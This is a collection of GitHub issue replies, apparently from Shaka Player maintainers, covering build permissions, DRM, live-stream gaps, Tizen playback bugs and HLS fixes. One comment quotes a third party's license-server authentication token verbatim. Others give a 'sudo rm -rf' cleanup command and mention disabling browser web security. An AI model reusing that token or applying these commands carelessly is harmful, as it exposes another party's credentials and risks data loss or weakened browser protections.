reflective access operation has occurred and related messages seem to be ignorable.  I suspect it has something to do with the version of Java you're running, which may dislike something the compiler (which is written in Java) is doing.\nThe only error here is in building the docs.  Jsdoc can't open a file in your sources.\nI suspect you ran something with sudo before this point.  You should definitely not be using sudo at all in Shaka Player development.  It is unnecessary, and you may wind up with certain files only readable by root.\nI can reproduce this by taking away my own access to docs/api:\n```sh\n$ sudo chown root docs/api\n$ sudo chmod 700 docs/api\n$ ./build/docs.py\n[INFO] Building the docs...\n/path/to/shaka/node_modules/mkdirp/index.js:90\n                    throw err0;\n                    ^\nError: EACCES: permission denied, mkdir '/path/to/shaka/docs/api/fonts'\n```\nYou must not have wiped everything out since you used sudo, or you may have used sudo in your working directory again since you re-cloned everything.  Please run the following commands to wipe out your broken Shaka Player folder and get a clean copy that is owned by you, the user, instead of root:\n```sh\ngo to your home directory:\ncd\nuse sudo to wipe out what you have,\nsince some of your files are clearly owned by root already\nsudo rm -rf shaka-player\nget a fresh copy, NOT with sudo\ngit clone https://github.com/google/shaka-player\nbuild NOT with sudo\ncd shaka-player\n./build/all.py\n```\nDoes this help?. I'm glad we were able to help.  Enjoy Shaka Player!. Hi @shineyjames123!  It looks like you skipped a question in the form:\nWhat are the manifest and license server URIs?:\nNOTE:\n  You can send the URIs to shaka-player-issues@google.com instead,\n  but please use GitHub and the template for the rest.\n  A copy of the manifest text or an attached manifest will not be\n  enough to reproduce your issue, and we will ask you to send a\n  URI instead.  You can copy the URI of the demo app to send us the\n  exact asset, licence server, and settings you have selected there.\nWithout this information, we can't reproduce or fix your issue.  Thanks!. Actually, I think I may see the issue in your configuration:\njs\n    timeout: 0, // timeout in ms, after which we abort; 0 means never\nWith a timeout of 0, a pending request will never be aborted and retried.  Try changing this value.. I'm happy to help.\nIt occurs to me that we should probably set a default of something other than 0.  Since I have never seen a segment size greater than 10s, we should probably default the timeout parameter to 30s.  That is loose enough to allow people on very slow connections (1/3 the necessary bandwidth) to pause and buffer content that they can't play otherwise.\nEven better would be stall detection.  I'll file a separate issue about that.. Changing the default timeout is easy, but we will need to call this out in upgrade docs and release notes for v2.5, so that nobody is surprised by the new behavior and everyone can configure the timeout back to 0 if they wish.\nProper stall detection has been filed as #1582.. Thank you for contributing!  You should also add yourself to CONTRIBUTORS and AUTHORS files (alphabetically).. Released in v2.5.0-beta2.. Yes, I believe so.. The removal of VTTRegion support was cherry-picked to v2.4.5.. Fix cherry-picked to v2.4.5.. If you are using the browser's native controls (video.controls = true or <video controls>), then this is expected.  The browser's native controls do not understand live streams.  To get a reasonable seek bar and duration for live streams, you need to use player.isLive() and player.seekRange() to display your own controls.\nFor an example of that, you can look at the controls in our demo app:\n - https://github.com/google/shaka-player/blob/89e1545510be5e4679ba02f939c969642e3b3ef5/demo/index.html#L130\n - https://github.com/google/shaka-player/blob/89e1545510be5e4679ba02f939c969642e3b3ef5/demo/common/controls.js#L20\n - https://github.com/google/shaka-player/blob/89e1545510be5e4679ba02f939c969642e3b3ef5/demo/common/controls.css#L17\nWe are working on building a UI library that will encapsulate these custom controls for you and make it easier to get consistent, usable controls on all platforms.. I am not sure of a release date yet.  We are going through release processes that depend on things we can't control.  But I expect that we will release it by the end of the year.. If you want access to the values in the current configuration, try Player.prototype.getConfiguration():\njs\nplayer = new shaka.Player(videoElement);\n// ...\nconst maxAttempts = player.getConfiguration().manifest.retryParameters.maxAttempts;\nYou may also be interested in the config tutorial, which introduces the basic config concepts and API.\nDoes this answer your question?. That's correct.  \"Load unsafe scripts\" will work around mixed content errors (http resources in https context), but CORS is separate from that.  The server must declare to the browser through HTTP response headers that the origin (the page context) is permitted to load that resource.  You can read more on CORS at MDN: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS. Correction: If you see the \"unsupported command-line argument: disable-web-security\" banner, it means disable-web-security is active.. You may still need to disable the service worker with --disable-web-security.. @plzhang, does this answer your questions?  Is there anything else you need?. The problem is that Chromium 56 is no longer supported by Widevine.  You will have to use at least Chromium 59.  According to the Qt WebEngine documentation, the latest version is based on Chromium 65, so I would expect an upgrade to solve your problem.\nAs for a workaround, this is something that is completely outside of the player's control.  The Widevine CDM (the DRM client) in Chromium 56 is being rejected by the Widevine license server (the DRM server).  If that server will not accept requests from that client, we can't do anything to change that in JavaScript.\nDoes this answer your question?. This should involve a deprecation warning for the old config settings, and backward compatibility for one full release cycle.. Is this a live stream?\nDoes it crash with dev tools open?\nWhat about with dev tools closed?\nI haven't reproduced with your content, but in the past, I have seen similar issues with live streams while dev tools is open.  It turned out in my case that the network panel of Chrome's dev tools was running out of memory.  So long as you are recording network traffic (on by default when you open dev tools), the payloads of those requests are kept in memory for inspection by dev tools.  So if you watch a 4Mbit/s HD stream, you will eat up 1.8GB RAM per hour.\nClicking on the red \"recording button\" in the network panel will turn off recording of network traffic.  If that doesn't help, please let us know, and we can take a look at your content.. Happy to help!  I wonder if it would be worth filing a bug on Chrome to ask that some limit be put on memory consumption in the network panel.. This isn't something that a JavaScript application can control.  Please file a bug on Chrome or Widevine about this.. According to https://stackoverflow.com/questions/47881242/is-there-a-polyfill-for-window-domparser-for-node you can use https://www.npmjs.com/package/xmldom\nHope that helps!. If we use web APIs to delete the data, and the browser doesn't free up any space on the disk, I'm not sure if there are any steps we can take at the JavaScript level to mitigate this.\nWe will track it as an external issue for now, but we're open to ideas on workarounds if anyone has any.. Fix cherry-picked to v2.4.5.. Confirmed.  On the transition from period 2 to period 3 at time 5:26, the gap-jumping logic fires and jumps ahead by about 0.4 seconds.  This occurs on Edge 17 on the latest nightly build of Shaka Player.\nThe gap according to the media element is from 327.0066211 to 327.0298412, size 23.22 ms.  Going deeper to the MediaSource level, the video buffer has no gap at all.  The gap only appears in the audio buffer.\nIf I effectively disable gap jumping by lowering the \"maximum small gap size\" setting in the demo, playback is smooth.  So the gap detected by the player can safely be ignored.\nLet me take some time to compare this to #1435.  Both of these issues may require a change to the gap jumping logic.. Actually, I take it back.  It appears to be a simple rounding error in the manifest.\nIn the third period, the first audio sample appears at 327.0298412.  The period start is 327 exactly.  The gap is caused by the final audio samples in period 2 getting chopped off at 327 exactly, so we lose 29.8412 ms of audio.\nSo I think the most robust solution might be:\n  1. Avoid a gap by allowing fudging the end of the append window, so that those last samples don't get cut off on MS Edge.\n  2. Change gap-jumping logic to avoid jumping very small audio gaps in the first place.  Less than 100ms may not be audible, and the browser will likely play through.  If the browser does not play through, our stall-detection will still rescue playback.. I was proposing to do both 1 & 2, actually.  But we'll need to discuss more internally.\nRight now I'm collecting data on gap tolerance across browsers to help drive the decision.. Other browsers will play through larger gaps, but it seems that Chrome will stall on an audio gap of as little as 20ms.  So changing gap-jumping logic may make things worse.\nTherefore I think we should just adjust the append window.  It fixes this particular piece of content, but we should be careful to make sure it doesn't break anything else.. I was finally able to verify that fudging the append window does not introduce any problems with any of the demo assets in Shaka Player on any of our supported platforms.  @kqyang, if you have any additional content you'd like us to test before we merge this change, please let me know!. We have tested with several additional assets across browsers to ensure that the fix for this (a fudge factor applied to the append window end) doesn't break anything else.. Fix cherry-picked for v2.4.6.. I don't know exactly.  But I don't think it will necessarily change filtering.  These attributes could be put into the roles list in the manifest structure.. Fix cherry-picked for v2.4.6.. Fix released in v2.5.0-beta2.. Fix released in v2.5.0-beta2.. Fix released in v2.5.0-beta2.. Cherry-picked to v2.4.x for release in v2.4.7.. Cherry-picked to v2.4.x for release in v2.4.7.. Hi @odedhutzler,\nIf you just need to examine the manifest contents and redirect to another URL, you can do that with an async response filter.  Some useful docs for this:\n - License Server Authentication tutorial, which includes async filters\n - License Wrapping, which uses a response filter\n - API docs for registerResponseFilter()\n - API docs for ResponseFilter type\n - API docs for Response type\nExample (untested):\n```js\nconst networkingEngine = player.getNetworkingEngine();\nnetworkingEngine.registerResponseFilter(async (type, response) => {\n  // Ignore non-manifest responses.\n  if (type != shaka.net.NetworkingEngine.RequestType.MANIFEST) {\n    return;\n  }\n// Decide whether or not to redirect.\n  const manifestData = StringUtils.fromUTF8(response.data);\n  const redirectUri = decideWhetherOrNotToRedirect(manifestData);\n  if (!redirectUri) {\n    // The original manifest data will be used unmodified. \n    return;\n  }\n// Make an additional request to the redirect URI.\n  const redirectedRequest = {uris: [redirectUri]};\n  const redirectedResponse = await networkingEngine.request(type, redirectedRequest);\n// Copy the response back onto the original response object.\n  response.uri = redirectedResponse.uri;\n  response.headers = redirectedResponse.headers;\n  response.data = redirectedResponse.data;\n// Now the rest of the system will see the replaced manifest data.\n});\n```\nDoes this help?. Hi @odedhutzler,\nIf you just need to examine the manifest contents and redirect to another URL, you can do that with an async response filter.  Some useful docs for this:\n - License Server Authentication tutorial, which includes async filters\n - License Wrapping, which uses a response filter\n - API docs for registerResponseFilter()\n - API docs for ResponseFilter type\n - API docs for Response type\nExample (untested):\n```js\nconst networkingEngine = player.getNetworkingEngine();\nnetworkingEngine.registerResponseFilter(async (type, response) => {\n  // Ignore non-manifest responses.\n  if (type != shaka.net.NetworkingEngine.RequestType.MANIFEST) {\n    return;\n  }\n// Decide whether or not to redirect.\n  const manifestData = StringUtils.fromUTF8(response.data);\n  const redirectUri = decideWhetherOrNotToRedirect(manifestData);\n  if (!redirectUri) {\n    // The original manifest data will be used unmodified. \n    return;\n  }\n// Make an additional request to the redirect URI.\n  const redirectedRequest = {uris: [redirectUri]};\n  const redirectedResponse = await networkingEngine.request(type, redirectedRequest);\n// Copy the response back onto the original response object.\n  response.uri = redirectedResponse.uri;\n  response.headers = redirectedResponse.headers;\n  response.data = redirectedResponse.data;\n// Now the rest of the system will see the replaced manifest data.\n});\n```\nDoes this help?. Then it seems like we can close this issue.  Let us know if you need anything else.. Then it seems like we can close this issue.  Let us know if you need anything else.. Sounds reasonable.  I would suggest adding a flag to the DASH config that would ignore the suggestedPresentationDelay, which defaults to false.  With that flag set, the configured default would be the only value in effect.  This way would not break compatibility or change behavior for anyone by default.. Sounds reasonable.  I would suggest adding a flag to the DASH config that would ignore the suggestedPresentationDelay, which defaults to false.  With that flag set, the configured default would be the only value in effect.  This way would not break compatibility or change behavior for anyone by default.. > We are trying to optimize thumbnail appearing asap for each seek by removing extra network traffic\n\nno luck so far to get down to a single segment only (observe 3-5 video segments downloaded with each currentTime change)\nDownloading 1 segment of the lowest quality is relatively quick, but for some reasons we can see rather a few segments downloaded for each seek, do you have any idea why that is happening? May it be its looking for a keyframe or similar reason? Any way to avoid it?\nit seems it loads one extra segment behind. \n\nFor content with both video & audio, that's 2 segments at a minimum.  Add to that some off-by-one logic we have to deal with manifest inaccuracies, and you're at 4 segments minimum for any time later than the first segment of the presentation.\nEven if you remove that logic in a fork, you're still (in my opinion) trying to solve this problem in a strange way.  If you want thumbnails, you should probably just have a JPEG thumbnail sheet.  It's the right tool for the job, and I would expect that it would go much better.\nYou could also try using a \"trick play track\" which is 1fps and all key-frames.  With a low-framerate track, you could then skip Shaka Player and MediaSource for the trick play track and use video.src= to load a single track (video only).\nYou could also try removing the logic which clears the buffer on an unbuffered seek.  That way, even if you fetch two segments, you're unlikely to have to refetch them ever.  That 33MB of buffering for the entire presentation at low bitrate would be an upper limit.  You'd eventually reach it by seeking around the presentation, but you'd never download a segment twice.\nDoes any of that help?. > We are trying to optimize thumbnail appearing asap for each seek by removing extra network traffic\n\nno luck so far to get down to a single segment only (observe 3-5 video segments downloaded with each currentTime change)\nDownloading 1 segment of the lowest quality is relatively quick, but for some reasons we can see rather a few segments downloaded for each seek, do you have any idea why that is happening? May it be its looking for a keyframe or similar reason? Any way to avoid it?\nit seems it loads one extra segment behind. \n\nFor content with both video & audio, that's 2 segments at a minimum.  Add to that some off-by-one logic we have to deal with manifest inaccuracies, and you're at 4 segments minimum for any time later than the first segment of the presentation.\nEven if you remove that logic in a fork, you're still (in my opinion) trying to solve this problem in a strange way.  If you want thumbnails, you should probably just have a JPEG thumbnail sheet.  It's the right tool for the job, and I would expect that it would go much better.\nYou could also try using a \"trick play track\" which is 1fps and all key-frames.  With a low-framerate track, you could then skip Shaka Player and MediaSource for the trick play track and use video.src= to load a single track (video only).\nYou could also try removing the logic which clears the buffer on an unbuffered seek.  That way, even if you fetch two segments, you're unlikely to have to refetch them ever.  That 33MB of buffering for the entire presentation at low bitrate would be an upper limit.  You'd eventually reach it by seeking around the presentation, but you'd never download a segment twice.\nDoes any of that help?. If you listen for the playing event, you will see that it fires after the update to 30 seconds.\nTo test this, I added these two lines to the top of shakaDemo.init in demo/main.js:\njs\nshakaDemo.init = function() {\n  video.addEventListener('playing', () => console.log('PLAYING'));\n  video.addEventListener('timeupdate', () => console.log('TIME', video.currentTime));\nThen I loaded the page with these hash parameters: #play;startTime=30\nThese are the logs I got:\nTIME 0\nTIME 30\nPLAYING\nTIME 30.04832\nTIME 30.294732\nSo the fact that the time event briefly read 0 is to be expected.  We were not actually playing yet, so we can't make any guarantees about the timestamp.  We seek to the start time (30 here) before playing, so the timeupdate events all seem to be correct.. If you listen for the playing event, you will see that it fires after the update to 30 seconds.\nTo test this, I added these two lines to the top of shakaDemo.init in demo/main.js:\njs\nshakaDemo.init = function() {\n  video.addEventListener('playing', () => console.log('PLAYING'));\n  video.addEventListener('timeupdate', () => console.log('TIME', video.currentTime));\nThen I loaded the page with these hash parameters: #play;startTime=30\nThese are the logs I got:\nTIME 0\nTIME 30\nPLAYING\nTIME 30.04832\nTIME 30.294732\nSo the fact that the time event briefly read 0 is to be expected.  We were not actually playing yet, so we can't make any guarantees about the timestamp.  We seek to the start time (30 here) before playing, so the timeupdate events all seem to be correct.. Thank you for catching this!. Thank you for catching this!. Fix cherry-picked to v2.4.5.. Fix cherry-picked to v2.4.5.. Fix cherry-picked to v2.4.5.. Confirmed.  I get no audio on Tizen 2017.. The container is audio/mp4, codec mp4a.40.2.  According to the support test page, this combination is supported by the device.  There's no obvious reason for this not to work.\nWithout a clear way to debug at the JS level on the device, this will be tricky to track down.. I do get audio playback on other content.. Debug logs show that audio has been selected and is being fed to the device.  There's nothing obvious that the player is doing wrong in this case.\nI'm not sure how this audio differs from the audio in our content, but ours plays and yours does not.\nI suspect something about it is incompatible with the Tizen decoders, but that's only a guess.  I don't have any data yet.. Not yet.  Something is going wrong inside the black box that is the Tizen media stack.  The only approach we have so far is to figure out how your content is encoded or packaged differently from ours, so that we could come up with a workaround you could apply on the encoding side.\nSo far, we don't know how your content is different.  If you have any ideas, please let us know.. Here are the ffmpeg and Shaka Packager settings we use in our live stream.\nFirst, we create an AAC audio loop and pipe it to UDP.\nsh\nffmpeg \\\n  -re -stream_loop -1 -i audio_loop.flac \\\n  -c:a aac -b:a 128k -f mpegts \\\n  udp://127.0.0.1:30000\nThen, in another process, we encode video and put it together with the UDP audio loop without transcoding the audio.  We're ingesting images from Gource via stdin for the video input.\nsh\nffmpeg \\\n  -probesize 32 -analyzeduration 0 -flags low_delay \\\n  \\\n  -thread_queue_size 2048 -fflags +genpts \\\n  -i udp://127.0.0.1:30000?overrun_nonfatal=1&fifo_size=1000000 \\\n  \\\n  -thread_queue_size 4096 -fflags +genpts+nobuffer -r 25 -f image2pipe -vcodec ppm -i - \\\n  \\\n  -c:a copy -f mpegts -vn -b:a 128k udp://127.0.0.1:40000 \\\n  \\\n  -c:v h264 -f mpegts -an -bf 0 -flags +cgop -g 100 -pix_fmt yuv420p \\\n  -b:v 2200k -vf pad=1280:720:20:20 udp://127.0.0.1:42000 \\\n  \\\n  -c:v h264 -f mpegts -an -bf 0 -flags +cgop -g 100 -pix_fmt yuv420p \\\n  -b:v 1000k -vf pad=1280:720:20:20,scale=768:432 udp://127.0.0.1:43000\nThe Packager is running in another process to ingest the UDP output from the second ffmpeg command and package it.\nsh\npackager \\\n  'input=udp://127.0.0.1:40000,stream=audio,init_segment=player-source/audio-init.mp4,segment_template=player-source/audio-$Number$.mp4,bandwidth=128000,playlist_name=player-source-aac.m3u8,hls_group_id=aac' \\\n  'input=udp://127.0.0.1:42000,stream=video,init_segment=player-source/720-init.mp4,segment_template=player-source/720-video-$Number$.mp4,bandwidth=2200000,playlist_name=player-source-720-h264.m3u8' \\\n  'input=udp://127.0.0.1:43000,stream=video,init_segment=player-source/480-init.mp4,segment_template=player-source/480-video-$Number$.mp4,bandwidth=1000000,playlist_name=player-source-480-h264.m3u8' \\\n  --segment_duration 4 \\\n  --fragment_duration 4 \\\n  --minimum_update_period 4 \\\n  --suggested_presentation_delay 30 \\\n  --preserved_segments_outside_live_window 75 \\\n  --time_shift_buffer_depth $(( 15 * 60 + 30 )) \\\n  --mpd_output player-source.mpd \\\n  --hls_master_playlist_output player-source.m3u8 \\\n  --hls_playlist_type LIVE. @TobbeEdgeware, thank you for your assistance and your analysis.  Can you please clarify one point for me?\nIf there is an overflow issue, do you believe that it is in Shaka Player?  Or in the Tizen media stack?\nIf it's in the Tizen media stack, might it be possible to work around it in the player by adjusting timestampOffset at the SourceBuffer level?. Playing with baseMediaDecodeTime is outside of Shaka's scope IMO, but I will try a hacky proof-of-concept to adjust timestampOffset.  If that works, we might be able to clean it up and incorporate it into Shaka Player.  Thanks for the advice!. @avelad, looking again at the timestamps, these are about 9 years away from reaching 2**53, which will be more than the integer accuracy of JavaScript's Number type and will cause failures related to the $Time$ substitution.\nSo even though I am going to try to workaround this issue on Tizen, please be aware of that broader limitation in JavaScript and consider reducing your timestamp values anyway.. I tried making changes in the DASH parser that would adjust timestamps artificially to work around Tizen's bug, but I was unsuccessful.  Those changes in the DASH parser (effectively lying about the media timestamps) triggered a cascade of other problems in PresentationTimeline, StreamingEngine, Playhead, etc.\nMy suggestion at this point would be to file a bug against Tizen and see if they can issue a patch to correct their support of large audio timestamps ( > 2**32 ms ).. Unfortunately, whether web view pauses media in the background is outside of our control.  If you disagree with this behavior, you will need to address the Chrome team at http://crbug.com/ .  Sorry about that!. This plays for me as a live stream in Chrome on Linux.  Why do you say it should play as VOD?  I'm not sure I see what the problem is.. Thanks for letting us know!. When you cast, the sender asks the Cast device to launch a particular application by ID.  To change the appearance of the receiver application, you must:\n\nregister a Cast developer account: https://cast.google.com/publish/#/overview\ndeploy your modified receiver app to a web server\nregister that app URL in the Cast developer console as a \"Custom Receiver\": https://cast.google.com/publish/#/overview\ncopy your new receiver ID from the Cast developer console\nupdate the app ID to point to your modified receiver app\n\nIn our demo, the receiver app ID is in demo/main.js, here: https://github.com/google/shaka-player/blob/d98543165cff6dc545eeaefcd660818d971cca33/demo/main.js#L91\nThis particular app ID points to our hosted receiver app in our most recent release, which is currently here: https://v2-4-4-dot-shaka-player-demo.appspot.com/demo/cast_receiver/index.html#build=compiled\nCast docs on registration can be found here: https://developers.google.com/cast/docs/registration. Does this answer your question?. The buffered member of the video element is the intersection of audio and video buffer levels.  If you want a breakdown, use player.getBufferedInfo().  This will show you video, audio, text, and \"total\" (intersection of audio and video as reported by video element).\nhttps://shaka-player-demo.appspot.com/docs/api/shaka.Player.html\nHope that helps!. Just so you know, I would support changes in the EME spec that would actually require MediaKeys to be set up before any content is appended to SourceBuffers.  I think this is just the right way to do things at the app level.\nI know that at least within Chrome, there are different media stack paths based on whether content is encrypted or not.  So it may not be practical for all browsers to allow you to append content first and set up MediaKeys later.\nI hope that context is helpful.. How do you not know your content could be encrypted?  We don't know, because we're middleware, so we have a way to configure us to expect it.  If you're an end-user app, we would expect you to know what your content looks like.  If that's a bad assumption, please tell us!\nIt's also worth noting that you can always play clear content through an encrypted path, so there's no major problem with setting up MediaKeys if you don't need it.\nMy view is that if it's VOD, you know everything about it in advance, because it's static.  If it's live, you may not control the ads that are played, but they are more likely to be in the clear than encrypted.  It's your main content that's more likely to be encrypted, and that's the part the streaming service provider controls and knows about.  There's no sense in encrypted ads on clear content.\nAnd if you're making middleware like we are, you should probably leave it up to the app developer to decide if we should set up MediaKeys.\nOur convention is that if there's a license server, you should set up MediaKeys.  You can't use MediaKeys without one, so that makes sense for us.  I'm totally open to another means to configure that if it doesn't suit you.\nDoes that help?. I'm glad we could help!. Released in v2.5.0-beta2.. @thasso. Fixed in 841f31b3ba485d1a8f82cda4d2e5e0d97aa8c139. Released in v2.5.0-beta2.. Xlink optimizations have been cherry-picked to v2.4.5.. @shabab11, I'm sorry, but I don't understand your question.  What do you mean by \"subscript\"?  Do you mean \"subtitles\"?. As far as I know, txt is not a web standard for subtitles.\nSRT predates WebVTT, and VTT seems to be derived from SRT.  SRT, however, has no standard character set or header, whereas WebVTT is always in UTF-8 and has a header.\nSo it would not be possible to support SRT without additional character set info and conversion routines.  If you want to support SRT, you might be able to write a text parsing plugin for that, but my guess is that it would be much easier to convert your subs to VTT on the backend.\nAs for download, you can store content in a database for offline playback, but it's not the same as downloading the files to your filesystem.  In general, web pages don't have access to your filesystem for playback.  (At least not through standard APIs across browsers.)\nWe have an API for offline storage and playback, with a fairly detailed tutorial here:\nhttps://shaka-player-demo.appspot.com/docs/api/tutorial-offline.html\nNow that your original questions have been resolved (locally hosting content, plus subtitles), may we close this ticket?  Please feel free to open a new one for further help with offline or for other issues.  Thanks!. No problem.  I'm glad we could help.. The use of the URL-safe variant of Base64 is mandated by the EME spec.  Firefox's decision to be flexible and support both variants is nice, but not required by the spec.  See section 9.1.4 of EME (\"Clear Key > License Format\"): https://www.w3.org/TR/encrypted-media/#clear-key-license-format\n\n9.1.4 License Format\nThis section describes the format of the license to be provided via the response parameter of the update() method.\nThe format is a JSON Web Key (JWK) Set containing representation of the symmetric key to be used for decryption, as defined in the JSON Web Key (JWK) specification [RFC7517].\nFor each JWK in the set, the parameter values are as follows:\n\n\"kty\" (key type)\n\"oct\" (octet sequence)\n\"k\" (key value)\n\n\nThe base64url encoding of the octet sequence containing the symmetric key value\n\n\n\"kid\" (key ID)\n\n\nThe base64url encoding of the octet sequence containing the key ID value\n. No problem.  Good luck with your project!. When we refer to manifests, you should understand that Shaka Player is for adaptive bitrate streaming.  In ABR streaming, the player can switch between various alternative formats on-the-fly.  For example, the player can adapt to the network bandwidth of the client and select the ideal resolution for your internet connection.\n\n\n\n\nAs opposed to a single MP4 or WebM file, this ABR streaming requires a format like DASH or HLS, which uses a manifest.  A manifest is a file that contains metadata for several alternative media files.  For example, English, Russian, or Chinese audio, or French, German, or Welsh subtitles, or different resolutions of video.\nIf you need guidance on creating DASH or HLS content for streaming/offline viewing in Shaka Player, may I recommend our sister project, Shaka Packager: https://github.com/google/shaka-packager  The Packager, when combined with something like ffmpeg to create different resolutions/bitrates, can be used to create DASH or HLS content and the manifests needed by the player.\n@BlessingD, if you're still interested after all that, can you please try again with the attachment of your source?  We don't see anything attached to your last post.  Thanks!. Here are the docs for error 7002:  https://shaka-player-demo.appspot.com/docs/api/shaka.util.Error.html#value:7002\nname | value | type | description\n-- | -- | -- | --\nNO_VIDEO_ELEMENT | 7002 | number | The call to Player.load() failed because the Player does not have a video element. The video element must either be provided to the constructor or to Player.attach() before Player.load() is called.\nSo when you call player.load(), the Player instance must have a <video> element associated with it.  You do this either in the Player constructor or by calling player.attach(video).  For example:\njs\nconst video = document.getElementById('my-video-element');\nconst player = new shaka.Player(video);\n//  ... some time later ...\nplayer.load(someManifestUri);\nOr:\njs\nconst player = new shaka.Player();\n//  ... some time later ...\nconst video = document.getElementById('my-video-element');\nplayer.attach(video);\n//  ... some time later ...\nplayer.load(someManifestUri);\nDoes this help?. Coming soon!  ;-). The basic template for building a UI is:\n\nRemove the controls attribute on the <video> tag or set video.controls = false in JavaScript.  This disables the browser's native controls.\nOverlay other HTML elements (buttons, etc) on top of the <video> tag using CSS.\nWhen those buttons are clicked, your event handlers can use the <video> and Player APIs to control playback.\n\nAs @ismena mentioned, our current demo controls are implemented in demo/common/controls.js and controls.css, and you are welcome to use those for inspiration or as a starting point for your own.\nOr, you can use our UI library. which will be released as a public beta very soon.. Fix released in v2.5.0-beta2.. I'm sorry, but my team doesn't directly support CAF.  CAF uses Shaka Player, but we are not responsible for the API or features exposed by CAF.  I will reach out to the CAF team today and see if they are able to help you, either in this forum, or in some other forum.  Thank you for your patience.. Hi @jvjvjv, I just had a talk with the Cast team.  For support on issues related to the Cast SDK and CAF, they asked that you please reach out to that team directly via one of the channels described here: https://developers.google.com/cast/docs/support. Since there's nothing else I can do to directly support you on this, I'll go ahead and close this issue.  But please feel free to reach out to us in the future for any issues with direct usage of Shaka Player.  Thanks!. Thanks for the report!  We'd be happy to take a pull request for this.  This team doesn't use perforce at all, and merging PRs is no big deal.  We're 100% git.  :-). Fix cherry-picked for v2.4.6.. Can you please provide more details?\nChanging the log level doesn't inherently change the logs that happen.  It changes which logs are shown.  So, for example, you may not see any difference between log level info and log level debug if your actions didn't trigger any debug logs.  Or if you reduce the log level, you'll never get more logs than you did with a higher level.\nCan you tell us what actions you took in the demo, and what log levels you tried?. Thank you!. PR cherry-picked for v2.4.6.. I was somewhat hindered in debugging by this Edge bug: https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/18153935/\nBut I have worked around that, and I am now looking into this playback issue.. With your request filter installed, I'm able to test your content.\nI tested several times in a row and playback did not begin.  I could click the play button manually, though, and get playback.\nThen I enabled the \"jump large gaps\" checkbox and reloaded.  I tested several more times and playback started automatically.\nI then disabled that checkbox and reloaded.  The next several times I tested, playback started automatically.\nI'm not sure what's going on, but at this point, I'm assuming it's an autoplay issue.  Can you confirm whether or not the play button works for you when you are in this stuck state?. Thanks.  We'll keeping working on it.. I'm unable to reproduce the issue at all today with the latest code.  About 10 times in a row, the stream started automatically.\nI did notice that the load latency is fairly high for this content, about 8-12 seconds.\nSome questions for you, @adgllorente, to help drive this forward:\n\nCan you reproduce the issue with the latest Shaka Player code from the master branch?  (It's possible that we already fixed something relevant.)\nRoughly how frequently does the issue reproduce for you?  (1 in 10, 1 in 20, 1 in 298, etc.)\nHow long are you waiting to evaluate whether or not playback begins?  (I had to wait 8-12 seconds each time.  There's a console log that gives the load latency, if you're curious.)\nIf/when the issue does reproduce, do you see a still frame of video?  (If so, this is an autoplay issue in Edge, outside of Shaka Player.). Okay.  I'll try again in Edge's private mode.. I can't reproduce in private mode.  I am getting an error 6007 (LICENSE_REQUEST_FAILED) that is out of my control.  Your server is rejecting the license request.\n\nI'm getting back an HTTP status 500 with the following body (formatted for your convenience):\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">\n  <soap:Body>\n    <soap:Fault>\n      <faultcode>soap:Server</faultcode>\n      <faultstring>Internal service error</faultstring>\n      <faultactor>http://msplayreadydrm.labs.gvp.telefonica.com/rightsmanager.asmx</faultactor>\n      <detail>\n        <Exception>\n          <StatusCode>0x8004c600</StatusCode>\n          <DebuggingData>Server record locator = f148ccc1-3603-4c8b-a868-c65c280151c2</DebuggingData>\n        </Exception>\n      </detail>\n    </soap:Fault>\n  </soap:Body>\n</soap:Envelope>. Oh, and I definitely still have your request filter installed.  I'm using exactly this:\njs\n  player.getNetworkingEngine().registerRequestFilter((type, request) => {\n    if (type == shaka.net.NetworkingEngine.RequestType.LICENSE) {\n      request.headers = {\n        'content-type': 'text/xml',\n        'x-authentication': 'AU_ZGAE6U_ULGyONgCgYVX238wZ1hKH_7pHaqdUB8PPFveH4J8dvH8W4qNlMN-AE8sle_gRNaO1ka49Li5GnFdUn3THgeRMEDRO0QZy_womUMUH-E0neFowUNh6PMLim4AkFvNVEHWHtixNSM7ChsgK8tqOKvTA80vnVG6z5MQfcvbVYJKtBmgYczJvsmJM4mEBi1I0XpPRliTiC_z-RrU5mjAQn9D9soHoBeQIfwnaW2D7svsT3U',  // eslint-disable-line max-len\n      };\n    }\n  });. @adgllorente, can you please provide us with a new key for testing?. I just noticed a detail I missed before.  In your repro video, you're using browserstack.  It's been many years since we used browserstack, but we used to experience problems with PlayReady on browserstack that couldn't be reproduced on real hardware.  Have you been able to reproduce this issue on a physical Windows machine?. I was able to reproduce it until just a few minutes ago, both with and without private browsing mode.  Now, two things seems to have changed at the same time:\n\nThere is a CORS error accessing the license server, so no license was fetched\nThe video plays anyway\n\nI verified that there are no keys available according to the MediaKeys API.  So this stream appears to be in the clear.\nQuestions for you, @adgllorente:\n\nIs this an actual encrypted stream?\nIf yes, is it always encrypted, or are there programs in the stream which are not encrypted?\nIs some other kind of maintenance happening right now that could be interfering with my testing?. Also, please let me know what your time zone is so that I can coordinate better with you.  I can be flexible on work hours to help speed up resolution of this issue.. We've had a very hard time reproducing this issue.  Are you still able to reproduce it with the latest updates to Edge & Windows?  Are you able to reproduce the issue with any of the publicly available test content in our demo app?. @kevinbol, I can see the same or similar issue on our 2017 Tizen TV.  I'm not sure what is causing it, but our automated playback tests for those assets fail inconsistently on our Tizen device.  I see MediaSource failures, so I expect either a bug in Tizen's media stack or some incompatibility between Tizen's decoders and the media content itself.  This is similar in spirit to #1610, but it's very difficult to debug these things.\n\nIf we can figure out the trigger, we may be able to produce a workaround.  But it might not be feasible, and we might have to rely on Samsung to fix the platform in some way.\nI'll update this issue once we have something more concrete to go on.. Confirmed.  Thanks for the report!  We're working on it.. I have a working fix locally, but I still need to clean things up, update the tests, and write new tests.. After a great deal of refactor and clean up (which I think we should keep), I have discovered that this bug can only be triggered if the URI loaded for the master playlist is a relative path:\njs\nplayer.load('media/master.m3u8');\nThe fix for that could be a single line in the HLS parser:\n```js\nshaka.hls.HlsParser.prototype.start = function(uri, playerInterface) {\n  goog.asserts.assert(this.config_, 'Must call configure() before start()!');\n  this.playerInterface_ = playerInterface;\n  this.manifestUri_ = uri;\n  return this.requestManifest_(uri).then(function(response) {\n// vvvvv\nthis.manifestUri_ = response.uri;  // ADD THIS LINE\n// ^^^^^\n\nreturn this.parseManifest_(response.data, uri).then(function() {\n 